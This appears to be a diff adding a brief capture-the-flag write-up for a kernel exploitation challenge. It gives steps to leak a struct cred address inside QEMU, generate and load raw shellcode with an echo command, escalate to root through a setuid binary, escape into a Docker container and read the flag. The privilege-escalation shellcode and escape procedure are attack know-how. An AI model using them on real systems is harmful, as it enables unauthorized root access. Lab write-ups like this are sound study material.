@@ -1,0 +1,19 @@
+
+short write up:
+
+step 1:
+- connect to transfer file connection and run "cd /tmp/fak" (KEEP THIS CONNECTION ALIVE)
+- then download your compiled kernel exploit for inside qemu and escape (suid and spawn root shell in docker)
+
+step 2:
+- connect to kernel connection, wait and then once it loads, run "./exploit fork"(inside qemu) then copy the leaked and calculated struct cred address
+
+- open other terminal and run "python3 shellcode.py" and paste the leaked and calculated struct cred address then copy the generated shellcode and paste in to the qemu. example "echo -ne "\x48\x31\xc0\x48\x31\xdb\x48\xb8\x30\x8b\xbe\x0e\x80\x88\xff\xff\x48\x8b\x18\x4d\x31\xff\x4c\x89\x3b\x4c\x89\x7b\x08\x4c\x89\x7b\x10\xc3" > load; chmod 777 load; ./load; (cat ./load ; cat) | ./exploit load" (run this inside the qemu) then press enter two times.
+
+- once it says "WIN" go to the transfer file connection and run "ls -la /tmp/fak" to confirm whether your exploit and qemu escape is now owned by root and has SUID enabled
+
+step 3:
+- once your qemu escape compiled code is owned by root and has suid enabled ("rwsrwxrwx") run it and then run "su" and "bash -i"
+- once you got root by whether it showing root@<container_id> run 'cd /root; cat /flag'
+
+
